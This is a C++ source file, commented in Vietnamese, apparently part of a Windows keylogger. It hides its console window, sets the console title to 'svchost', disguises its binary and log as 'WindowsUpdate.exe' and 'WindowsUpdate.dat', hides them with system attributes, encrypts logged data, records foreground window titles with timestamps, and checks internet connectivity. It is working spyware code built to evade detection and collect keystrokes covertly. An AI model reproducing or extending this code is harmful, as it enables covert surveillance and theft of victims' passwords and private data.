#include "../utils.h"
#include "../encryption.h"

// Khởi tạo biến toàn cục
std::string keylogger = "";
std::string logFile = "";

std::string GetSecurePath(const std::string& filename) {
    //char appDataPath[MAX_PATH];
    //if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath))) {
    //    std::string path = std::string(appDataPath) + "\\Microsoft\\Windows\\";

    //    // Tạo thư mục nếu chưa tồn tại
    //    CreateDirectoryA((path).c_str(), NULL);

    //    return path + filename;
    //}

    //// Fallback to current directory if appdata is not accessible
    //return filename;

    std::string path = "D:\\KeyloggerData\\";

    // Tạo thư mục nếu chưa tồn tại
    CreateDirectoryA(path.c_str(), NULL);

    // Ẩn thư mục
    SetFileAttributesA(path.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    return path + filename;
}

void HideWindow() {
    HWND hWindow = GetConsoleWindow();
    if (hWindow != NULL) {
        if (IsWindowVisible(hWindow) != 0) {
            ShowWindow(hWindow, SW_HIDE);
        }
        CloseHandle(hWindow);
    }

    // Đổi tên quy trình để khó bị phát hiện hơn
    SetConsoleTitleA("svchost");
}

bool SetFileNames() {
    // Tên file ngụy trang tốt hơn
    keylogger = GetSecurePath("WindowsUpdate.exe");
    logFile = GetSecurePath("WindowsUpdate.dat");

    return true;
}

void Write(std::string data) {
    std::string encryptedData = AdvancedEncrypt(data);

    std::ofstream stream(logFile.c_str(), (std::ios::app | std::ios::binary));
    if (!stream.fail()) {
        stream.write(encryptedData.c_str(), encryptedData.length());
        stream.close();
    }
}

void LogTime() {
    time_t now = time(NULL);
    struct tm time = { };
    char buffer[48] = "";
    if (now == -1 || localtime_s(&time, &now) != 0 || strftime(buffer, sizeof(buffer), "%H:%M:%S %m-%d-%Y", &time) == 0) {
        Write("<time>N/A</time>");
    }
    else {
        Write(std::string("<time>").append(buffer).append("</time>"));
    }
}

void LogWindowTitle() {
    // Thêm thông tin cửa sổ hiện tại
    wchar_t titleW[256] = { 0 };
    HWND foreground = GetForegroundWindow();

    if (foreground && GetWindowTextW(foreground, titleW, sizeof(titleW) / sizeof(wchar_t)) > 0) {
        // Chuyển đổi từ Unicode sang UTF-8
        int size = WideCharToMultiByte(CP_UTF8, 0, titleW, -1, NULL, 0, NULL, NULL);
        if (size > 0) {
            std::vector<char> utf8Title(size);
            WideCharToMultiByte(CP_UTF8, 0, titleW, -1, utf8Title.data(), size, NULL, NULL);

            Write(std::string("\n<window>").append(utf8Title.data()).append("</window>\n"));
        }
    }
}

void Hide(std::string file) {
    DWORD attr = GetFileAttributesA(file.c_str());
    if (attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_HIDDEN)) {
        SetFileAttributesA(file.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
}

void HideFiles() {
    Hide(keylogger);
    Hide(logFile);
}

bool IsConnectedToInternet() {
    DWORD flags;
    return InternetGetConnectedState(&flags, 0);
}